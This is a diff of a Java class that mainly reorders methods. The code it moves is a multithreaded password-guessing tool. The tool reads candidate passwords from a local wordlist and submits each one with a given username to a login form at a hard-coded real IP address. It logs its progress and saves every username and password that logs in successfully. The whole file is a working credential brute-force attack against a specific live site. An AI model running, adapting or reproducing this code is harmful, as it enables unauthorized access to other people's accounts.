@@ -1,4 +1,4 @@
-package Z;
+package z;
 
 import java.io.*;
 import java.net.URL;
@@ -9,8 +9,6 @@ import java.util.concurrent.CountDownLatch;
 
 public class sW implements Runnable {
     private static CountDownLatch latch;
-    private Thread t;
-    private String un;
     private static BufferedWriter bw;
 
     static {
@@ -21,35 +19,15 @@ public class sW implements Runnable {
         }
     }
 
+    private Thread t;
+    private String un;
 
-    @Override
-    public void run() {
-        try {
-            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream("/home/zhc/p.txt")));
-//            71900
-            for (long i = 0; i < 9999999999999999L; i++) {
-                String rPW;
-                String r = br.readLine();
-                if (r != null) {
-                    rPW = r;
-                } else break;
-                if (i % 50 == 0) {
-                    String cLog = Thread.currentThread().getName() + " Login... " + this.un + " " + rPW;
-                    System.out.println(cLog);
-                }
-                if (Login(this.un, rPW)) {
-//                    bw.write("OK!" + this.un + "  " + rPW + "\r\n");
-                    bw.write(this.un + "\t" + rPW + "\r\n");
-                    bw.flush();
-//                    OkJOP(this.un + "  " + rPW);
-                    System.out.println("OK!" + this.un + "  " + rPW);
-                }
-            }
-            Thread.sleep(50);
-            latch.countDown();
-        } catch (IOException | InterruptedException e) {
-            ExceptionMessage(e);
-        }
+
+    private sW(String username) {
+        this.un = username;
+    }
+
+    private sW() {
     }
 
     public static void main(String[] args) {
@@ -126,29 +104,10 @@ public class sW implements Runnable {
         }
     }
 
-    private void S() {
-        if (t == null) {
-            t = new Thread(this);
-            t.start();
-        }
-    }
-
-    private sW(String username) {
-        this.un = username;
-    }
-
-    private sW() {
-    }
-
     private static String getW(String un, String pw) {
         return String.format("http://218.4.55.34/index.aspx?__VIEWSTATE=%%2FwEPDwUKMTgxNjY0ODgxMQ9kFgICAw9kFgwCBw8PZBYCHgdvbkNsaWNrBRRyZXR1cm4gZG91YmxlQ2hlY2soKWQCEw8PFgIeBFRleHQFEuOAjuS4quS6uuaooeW8j%%2BOAj2RkAhcPDxYCHwEFDjEyMS4yMjguMTQzLjUxZGQCGQ8PFgIfAQUOMTIxLjIyOC4xNDMuNTFkZAIbDw8WAh8BBQEyZGQCHQ8PFgIfAQVFSVDvvJow5q%%2Br56eSJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A75Li75py65ZCN77yaNDUxNi4yNTgz5q%%2Br56eSJm5ic3A7ZGRk9TN2nqVqAray6rvtDmUFIqCzYnk%%3D&__VIEWSTATEGENERATOR=90059987&__EVENTVALIDATION=%%2FwEWBALC9IzwDQKYpfGYCALw08i7DQLi44fLCYlDMeFb3XmDRKa9vXxoRnUpFc52&TextBoxuser=%s&TextBoxpwd=%s&Btnlogin=%%E7%%99%%BB%%E5%%BD%%95"
                 , un, pw);
     }
-
-    /*private static void OkJOP(String TitleContent) {
-        System.out.println("OK!" + TitleContent);
-        JOptionPane.showMessageDialog(null, "OK! " + TitleContent, "OK", JOptionPane.INFORMATION_MESSAGE);
-    }*/
 
     private static boolean Login(String un, String pw) {
         boolean b = false;
@@ -192,12 +151,52 @@ public class sW implements Runnable {
         return b;
     }
 
-
     private static void ExceptionMessage(Exception e) {
         e.printStackTrace();
 //        JOptionPane.showMessageDialog(null, e.toString(), "Exception", JOptionPane.ERROR_MESSAGE);
     }
 
+    /*private static void OkJOP(String TitleContent) {
+        System.out.println("OK!" + TitleContent);
+        JOptionPane.showMessageDialog(null, "OK! " + TitleContent, "OK", JOptionPane.INFORMATION_MESSAGE);
+    }*/
+
+    @Override
+    public void run() {
+        try {
+            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream("/home/zhc/p.txt")));
+//            71900
+            for (long i = 0; i < 9999999999999999L; i++) {
+                String rPW;
+                String r = br.readLine();
+                if (r != null) {
+                    rPW = r;
+                } else break;
+                if (i % 50 == 0) {
+                    String cLog = Thread.currentThread().getName() + " Login... " + this.un + " " + rPW;
+                    System.out.println(cLog);
+                }
+                if (Login(this.un, rPW)) {
+//                    bw.write("OK!" + this.un + "  " + rPW + "\r\n");
+                    bw.write(this.un + "\t" + rPW + "\r\n");
+                    bw.flush();
+//                    OkJOP(this.un + "  " + rPW);
+                    System.out.println("OK!" + this.un + "  " + rPW);
+                }
+            }
+            Thread.sleep(50);
+            latch.countDown();
+        } catch (IOException | InterruptedException e) {
+            ExceptionMessage(e);
+        }
+    }
+
+    private void S() {
+        if (t == null) {
+            t = new Thread(this);
+            t.start();
+        }
+    }
 
     private void l() {
         try {
